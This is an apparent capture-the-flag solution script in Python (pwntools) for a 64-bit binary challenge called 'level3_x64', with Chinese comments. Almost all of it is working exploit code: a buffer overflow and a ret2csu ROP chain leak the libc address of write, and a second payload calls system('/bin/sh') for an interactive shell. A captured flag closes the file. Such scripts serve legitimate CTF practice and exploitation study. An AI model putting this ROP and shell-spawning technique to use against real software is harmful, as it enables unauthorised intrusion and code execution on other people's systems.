#!
#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
如果依赖特定版本的libc，请使用patchelf对可执行文件修改
例如，使用x64的2.23版本的libc，

patchelf --set-interpreter /glibc/2.23/64/lib/ld-linux-x86-64.so.2 <binary>
patchelf --replace-needed libc.so.6 /glibc/2.23/64/lib/libc.so.6 <binary>

"""

import re
import sys
from os import path
from pwn import *
from pwnlib import gdb
from pwnlib.ui import pause

context(arch="amd64", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "level3_x64_patched")
_, host, port = re.split("\s+", "nc pwn2.jarvisoj.com 9883")

elf = ELF(elf_name)
libc = elf.libc
io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)


def exp_x64_csu_init(
    pop_rbx_addr: int,
    mov_rdx_r13_addr: int,
    ret_addr: int,
    p_func_addr:int,
    arg1:int,
    arg2:int,
    arg3:int
):
    """
    仅适用于：
        1. 三个参数以内函数
        2. 溢出空间较大（> 128 bytes）
        3. 第一个参数较小（< 4 bytes），例如write和read等
    """
    import struct
    return b"".join([
        struct.pack("<Q", pop_rbx_addr),
        struct.pack("<Q", 0),  # pop     rbx
        struct.pack("<Q", 1),  # pop     rbp
        struct.pack("<Q", p_func_addr),  # pop     r12; call    qword ptr [r12+rbx*8]
        struct.pack("<Q", arg3),  # pop     r13; mov     rdx, r13
        struct.pack("<Q", arg2),  # pop     r14; mov     rsi, r14
        struct.pack("<Q", arg1),  # pop     r15; mov     edi, r15d
        struct.pack("<Q", mov_rdx_r13_addr),
        7 * struct.pack("<Q", 0xcafebeefdeadface),
        struct.pack("<Q", ret_addr),
    ])


def main():
    POP_RBX = 0x4006AA
    MOV_RDX_R13 = 0x400690
    POP_RDI_RET = 0x4006b3
    payload = b"@" * (0x80 + 8)
    payload += exp_x64_csu_init(
        POP_RBX,
        MOV_RDX_R13,
        elf.sym["_start"],
        elf.got["write"],
        1, elf.got["write"], 8
    )
    # gdb.attach(io, gdbscript="""
    #     b *0x400619
    #     b *0x4006AA
    # """)
    # pause()
    io.recvuntil(":\n")
    io.send(payload)
    write_addr = u64(io.recv(8))
    libc.address = write_addr - libc.sym["write"]

    payload = flat((
        b"@" * (0x80 + 8),
        POP_RDI_RET,
        next(libc.search(b"/bin/sh")),
        libc.sym["system"],
    ))
    io.recvuntil(":\n")
    # pause()
    io.send(payload)

    io.interactive()

if __name__ == "__main__":
    main()

# CTF{b1aeaa97fdcc4122533290b73765e4fd}
